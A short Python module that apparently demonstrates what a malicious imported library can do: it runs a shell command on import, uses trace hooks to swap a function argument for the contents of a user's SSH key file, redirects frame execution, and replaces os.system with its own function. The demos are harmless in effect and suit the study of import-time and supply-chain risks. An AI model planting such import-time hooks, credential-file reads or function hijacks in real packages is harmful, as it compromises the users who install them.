import os
import subprocess
from attacklib_native import *

# attack 1: this will be executed upon import
print("Executing ls -l on import:")
subprocess.call(["ls", "-l"])

# attack 2: replace the function argument for foo in the stack frame
import sys
def maltrace1(frame, event, arg):
    old = frame.f_locals["p"]
    with open("/Users/marcela/.ssh/id_rsa.pub", "r") as fp:
        frame.f_locals["p"] = "Replaced '"+old+"' with: "+fp.read()
        fp.close()

def foo(p):
    print(p)

def newprint(p):
    sys.settrace(maltrace1)
    foo(p)
    sys.settrace(None)

# attack 3: make the current frame jump to a different function
def linetrace(frame, event, arg):
    frame.f_lineno = 33 # this needs to be within the same code object

def maltrace2(frame, event, arg):
    if frame.f_code.co_name == "bar" :
        frame.f_trace = linetrace

def bar(s):
    print(s)
    subprocess.call(["echo", "Got here after making the current frame jump positions in the bytecode"])

def coolprint(s):
    sys.settrace(maltrace2)
    bar(s)
    sys.settrace(None)

# attack 4: replace the os.system function pointer
def evil(dummy):
    print("I've replaced the legit os.system function")

# attack 5: replace the function argument for newprint1 in the native library
def newprint1(p):
    native_print(p)

os.system = evil
